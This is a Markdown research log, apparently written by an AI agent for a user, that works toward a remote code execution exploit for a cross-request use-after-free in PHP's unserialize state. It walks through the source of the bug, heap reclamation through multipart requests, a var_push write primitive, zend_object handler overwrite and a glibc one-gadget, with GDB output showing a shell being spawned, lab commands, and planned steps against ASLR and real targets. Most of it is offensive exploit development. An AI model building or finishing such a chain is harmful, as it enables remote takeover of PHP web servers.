# Root Cause: Pre-RINIT Cross-Request UAF in `BG(unserialize)` (Pure-HTTP Track)

This file records the new exploit chain supplied by the user and our independent reproduction progress. The earlier custom-PHP exploit using `session_unset`/`session_encode` is **no longer considered a valid result** because it violates the no-target-specific-PHP, fully remote requirement; the related pages have been removed from the webroot.

---

## 1. New Chain (User-Provided Intelligence)

1. The first request OOMs while decoding a large session through upload progress, leaving `BG(unserialize).level=1` and a **freed `data` pointer**.
2. The second request reclaims the 8216-byte object through two 8214-byte multipart parameters.
3. Backslash folding is used to construct a valid 48-bit `data->last` pointer.
4. A binary progress marker forges `var_entries`, turning `var_push` into a write to a chosen address.
5. Two `var_entries` trampolines eventually overwrite `zend_object->handlers`.
6. Object destruction reaches a glibc one-gadget. GDB confirmed:
   ~~~text
   VAR_PUSH ... destination=0x7f9d62671000 rval=0x7f9d62664980
   VAR_PUSH ... destination=0x7f9d62602608 rval=0x7f9d62664940
   process 2544 is executing new program: /usr/bin/dash
   ~~~

This is not the progress-bucket UAF described in public analyses. The root cause is the cross-request residue of `BG(unserialize)` state from the **pre-RINIT** phase.

---

## 2. Source Mapping

### 2.1 The 8216-byte Object

In `ext/standard/var_unserializer.re`:

~~~c
#define VAR_ENTRIES_MAX 1018
typedef struct {
    zend_long used_slots;     // 8
    void *next;               // 8
    zval *data[1018];         // 8144
} var_entries;                // 8160

struct php_unserialize_data {
    var_entries      *last;          // 0
    var_dtor_entries *first_dtor;    // 8
    var_dtor_entries *last_dtor;     // 16
    HashTable        *allowed_classes; // 24
    HashTable        *ref_props;     // 32
    zend_long         cur_depth;     // 40
    zend_long         max_depth;     // 48
    var_entries       entries;       // 56
};                                    // sizeof = 56 + 8160 = 8216
~~~

GDB confirmed `sizeof(struct php_unserialize_data) == 8216`.

### 2.2 Lifetime

~~~c
php_var_unserialize_init():
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = emalloc(8216);
        d->last = &d->entries;
        ...
        BG(unserialize).data = d;
        BG(unserialize).level = 1;
    } else {
        d = BG(unserialize).data;   // reuse stale pointer
        ++BG(unserialize).level;
    }

php_var_unserialize_destroy():
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d); efree(d);
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level)
        BG(unserialize).data = NULL;
~~~

OOM/ `zend_bailout` skips `PHP_VAR_UNSERIALIZE_DESTROY`, leaving `level=1` and `data` dangling. The next pre-RINIT unserialize directly reuses this structure.

### 2.3 The `var_push` Write Primitive

~~~c
static inline void var_push(php_unserialize_data_t *var_hashx, zval *rval)
{
    var_entries *var_hash = (*var_hashx)->last;
    if (var_hash->used_slots == VAR_ENTRIES_MAX) {
        var_hash = emalloc(sizeof(var_entries));
        ...
        (*var_hashx)->last->next = var_hash;
        (*var_hashx)->last = var_hash;
    }
    var_hash->data[var_hash->used_slots++] = rval;
}
~~~

If an attacker controls `data->last`, the write address is:

~~~text
*(zval**)(last + offsetof(var_entries, data) + used_slots*8) = rval
= last + 16 + used_slots*8
~~~

`rval` is a `zval*` (the unserializer's temporary value address can be predicted), and `used_slots` can also be controlled through reclaimed contents. Two trampolines can use the first written pointer as the next `last`/target, eventually overwriting `zend_object->handlers`; object destruction then reaches the one-gadget.

---

## 3. Pure-HTTP Reproduction Progress on This Track

### 3.1 Preparation: Create a Large Session Through Upload Progress (Pure HTTP)

- The Apache lab configuration can be switched between 64M + `session.upload_progress.cleanup Off` for creating the file and 8M + cleanup On for A/B.
- Request 0: multipart `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS=<4MB 'A'>` + file part.
- Measured `/tmp/sess_bgtest123`: **4,194,655 bytes**.
- Small session `/tmp/sess_bgsmall123`: 351 bytes, used for normal decoding in request B.

### 3.2 Request A: Post-RINIT OOM While Decoding a Large Session

Target page is an ordinary session page:

~~~php
<?php session_start(); echo "ok\n"; ?>
~~~

Request: `GET /index.php`, `Cookie: PHPSESSID=bgtest123`. Decoding 4 MB of data OOMs under the 8M limit.

Observed:

~~~text
HTTP/1.1 200 OK
Fatal error: Allowed memory size of 8388608 bytes exhausted ...

basic_globals.unserialize.level = 1
basic_globals.unserialize.data  = 0x7ffff5e6d000
~~~

This `data` pointer refers to `php_unserialize_data` (8216B); `last=&entries` (+0x38). The object has been freed after request shutdown, leaving the BG pointer dangling.

### 3.3 Request B: Reuse the Stale BG Before RINIT and Reclaim the Structure

Shape (`tools/bg_b.py` / `tools/bg_b_file.py`):

- No file: `PHPSESSID=bgsmall123`, `PHP_SESSION_UPLOAD_PROGRESS=pwn`, and two 8214-byte fields `p1`/`p2` (10-character boundary).
- END cleanup calls `php_session_initialize` → `s_read` → `php_var_unserialize_init` before RINIT, reusing stale `BG.data`.

Observed in GDB:

~~~text
INIT level=1 data=0x7ffff5e6d000
0x7ffff5e6d000: 0x00007ffff5e6d030 0x41da9b9294603d72
0x7ffff5e6d010: 0x00007ffff5e6d020 0x51da9b9294603d72
0x7ffff5e6d020: 0x00007ffff5e6d000 0x71da9b9294603d72
0x7ffff5e6d030: 0x00007ffff5e6d040 0x31da9b9294603d72
INIT level=0 data=(nil)
~~~

- `BG.level=1` and `data` still points to A's address, confirming pre-RINIT reuse.
- Multipart contents rewrote the 8216-byte structure; fields such as `data->last` became pointers into the structure itself (0x...6d030/6d020/6d000/6d040).
- In the with-file version (`bg_b_file.py`), the structure is reclaimed during FILE_START decoding by multipart header contents such as `a.bin`/`Content-`; later it crashes when `tmp_var` dereferences `last_dtor`:

~~~text
INIT level=1 data=0x7ffff5e6d000
0x...6d000: 0x0000006e69622e61 0x554acc7090e8c40e
0x...6d010: 0x2d746e65746e6f43 0x354acc0065707954
0x...6d020: 0x00007ffff5e6d040 0x554acc7090e8c40e
SIGSEGV addr=(nil)
#0 tmp_var (num=1, ...)
#1 var_tmp_var
#2 ps_srlzr_decode_php
#3 php_session_decode
#4 php_session_initialize
#5 php_session_rfc1867_update
#6 php_session_rfc1867_callback
#7 rfc1867_post_handler
~~~

### 3.4 Confirmed Facts

- `BG(unserialize).level=1` and `data` persist across requests after A's post-RINIT OOM.
- B's pre-RINIT `php_var_unserialize_init` reuses the dangling `data` without a new allocation.
- Two 8214-byte multipart parameters/parser buffers can rewrite the 8216-byte structure.
- Structure fields are used as `var_entries`/`var_dtor_entries` pointers; `tmp_var`/`var_push` read and write through them (a `tmp_var` crash has been observed).

### 3.5 Still Incomplete

- Use the backslash-folding technique from the supplied chain to control `data->last` as an **arbitrary valid 48-bit pointer**, rather than the current self-referential pointer into the structure.
- Build fake `var_entries`, control `used_slots`, and turn `var_push` into a write to a chosen address.
- Use two trampolines to overwrite `zend_object->handlers`, then reach the glibc one-gadget (which requires a leak under ASLR).
- Make A's OOM/large-session preparation fully remote and repeatable. The current lab requires switching Apache between 64M/cleanup Off and 8M/cleanup On; a real target needs a sufficiently large application session and memory_limit.

---

## 4. Reproduction Commands (Lab)

~~~bash
# 1) Use 64M + cleanup Off to create sessions over pure HTTP
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 64M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup Off/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
cd ~/php-lab
SID=bgsmall123 python3 bg_create.py 8
SID=bgtest123 python3 bg_create.py 4194304

# 2) Use 8M + cleanup On; A OOMs while decoding the large session
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 8M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup On/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
python3 bg_cookie_a.py        # GET + Cookie PHPSESSID=bgtest123; confirm OOM

# 3) B: reuse BG before RINIT
python3 bg_b.py               # no file, two 8214-byte parameters
# Or: python3 bg_b_file.py    # with file; decode happens at FILE_START
~~~

GDB observation point:

~~~gdb
b php_var_unserialize_init
commands
silent
printf "INIT level=%u data=%p\n", basic_globals.unserialize.level, basic_globals.unserialize.data
x/8gx basic_globals.unserialize.data
continue
end
~~~

---

## 5. Relationship to Earlier Notes

- The custom-PHP `session_unset`/`session_encode` exploit in sections 3/10 of `NOTES.md` is **no longer a valid deliverable**. It demonstrated Defect D/the leak mechanism, but violates the current no-target-specific-PHP, pure-HTTP constraint.
- The old exploit pages were moved to `~/php-lab/offline/`; the webroot now contains only the ordinary `index.php`.
- This track now treats the `BG(unserialize)` UAF as the root cause. The next key step is precise layout of the 8216-byte structure fields and the two-stage `var_push` write.

---

## 6. Reference Logs

- `logs/bg_gf.log` — post-RINIT A + pre-RINIT B with `INIT level=1` (version where parameters did not overwrite the structure).
- `logs/bg_gi.log` — post-RINIT A + B with a file; multipart contents reclaim the structure and trigger a `tmp_var` crash.
- `logs/bg_gj.log` — post-RINIT A + B without a file, two 8214-byte parameters, and self-referential pointers in the structure.

---

## 7. 2026-10-21 Addendum: Allocator Behavior Revealed by Watchpoints (Final RCE Blocker)

Set a hardware watchpoint on A's `BG.data` (here `0x7ffff5e6d000`), then sent B (no file, two 8214-byte parameters). Results:

~~~text
WATCH#1 val=0x7461642d6d726f66   # "form-data"
  #0 memcpy
  #1 _estrndup
  #2 php_ap_getword
  #3 rfc1867_post_handler
WATCH#2 val=0x7ffff5e6d010
  #0 zend_mm_set_next_free_slot
  #1 zend_mm_free_small (bin_num=1, ptr=0x7ffff5e6d000)
  #2 zend_mm_free_heap
  #3 _efree
  #4 rfc1867_post_handler
WATCH#3 val=0x7fff656d616e   # "name="
WATCH#6 val=0x316c6c616d736762 # "bgsmall1" (PHPSESSID value)
  #1 multipart_buffer_read_body
~~~

Conclusion: in our post-RINIT A scenario, the **8216-byte `php_unserialize_data` block is reclaimed by Zend MM and split into 16-byte small bins**. During B parsing, small strings such as `_estrndup("form-data")`, `"name="`, and the PHPSESSID value repeatedly occupy `0x...6d000`. Therefore the two 8214-byte parameters do not occupy that address as one block; `data->last` reads a small-bin free-list pointer (such as 0x...6d030), not an attacker-controlled 48-bit pointer.

`zend_mm_free_small(bin_num=1)` is the smallest 16-byte bin; `form-data` (10B), `name=` (6B), and `bgsmall123` (11B) all use it. The 56-byte structure header is split among four 16-byte slots at `0x...6d000/6d010/6d020/6d030`, and the free list overwrites the first qword in each slot.

### Next Steps (RCE)

1. **Keep the 8216-byte block as a large free block** instead of splitting it into small bins:
   - Try different ways to end A (pre-RINIT OOM without shutdown versus post-RINIT shutdown; `unclean_shutdown`/`report_memleaks` flags) so B's startup leaves the block on the large-free list.
   - Or allocate an 8193/8215-byte buffer at the very start of B (before the two 8214-byte parameters) to claim the block before it is split.
2. Once `data->last` is controllable:
   - Set `last_dtor=0` so `tmp_var` takes the `emalloc` branch.
   - Forge `var_entries` (`used_slots`, `next`, `data[]`) in a parameter buffer/adjacent large block so `var_push` writes to `zend_object->handlers`.
   - Use two trampolines, object destruction, and the glibc one-gadget.
3. Address ASLR after RCE: the new chain has no existing pure-HTTP leak. Consider constructing a read/write through `var_push` itself or a controlled out-of-bounds read from the same BG UAF. Do not reuse the earlier custom-PHP `session_encode` leak.

### Evidence

- Raw watchpoint log: `logs/bg_watch.log` (this run's `/tmp/gw.log`).

---

## 8. Actual RCE Prerequisite: `BG(serialize_lock)=1` (Target-Application Dependency)

Source check:

~~~c
PHPAPI void php_var_unserialize_destroy(php_unserialize_data_t d) {
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d);
        efree(d);                 // free the 8216-byte block
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level) {
        BG(unserialize).data = NULL;
    }
}
~~~

Only when `BG(serialize_lock) == 1` do we get the dangling state where **`d` has been freed but `BG.level` remains 1 and `BG.data` still points to `d`**. This also leaves a large-free block, instead of one that whole-heap shutdown splits into small bins.

Locations that increment/decrement `BG(serialize_lock)`:

- Around lines 277/294 in `ext/standard/var_unserializer.re`: before/after calling an object's `__wakeup`/`__unserialize`.
- Before/after class lookup/autoload/`unserialize_callback_func` (around lines 1232/1256/1268).
- Lines 855/876 in `ext/standard/var.c`: serialize magic methods.

So the first request in the exploit chain must contain **an object in session data whose `__wakeup`/`__unserialize` (or autoload/`unserialize_callback_func`) triggers OOM during decoding**. OOM's `zend_bailout` skips `BG(serialize_lock)--`; the outer destroy sees lock=1, frees `d`, but does not clear BG, leaving the dangling 8216-byte block on the large-free list.

Our lab's large session contains only arrays/strings (upload-progress-generated progress data), without object magic methods. Therefore:

- Ordinary decode OOM: destroy is not reached, so `d` remains allocated (the earlier pre-RINIT A retained intact `data` memory).
- Post-RINIT OOM followed by request shutdown: the whole heap is reclaimed, and the 8216-byte block is split into 16-byte small bins (confirmed by watchpoint); the 8214-byte parameters cannot reclaim it as one block.

**Conclusion: this chain is unreachable with a vanilla session page and an array session built over pure HTTP. It requires an object with `__wakeup`/`__unserialize` in the target application's session (or configured autoload/`unserialize_callback_func`).** This is an application-level dependency that request B cannot supply.

### What Is Needed to Continue

- Allow a **validation-only scaffold class** on the lab target page (`__wakeup` performs a large allocation that OOMs) so we can complete the `var_entries`/`zend_object->handlers`/one-gadget stages. The final exploit would not include this PHP; it would stand in for a gadget already present in the target application.
- Or provide an object/class from the real target application that enters the session (which application, which session key, and what magic method), so the large session can be built around that object.
- Without either condition, continuing on the vanilla page requires forged/custom PHP and would violate the current constraint.
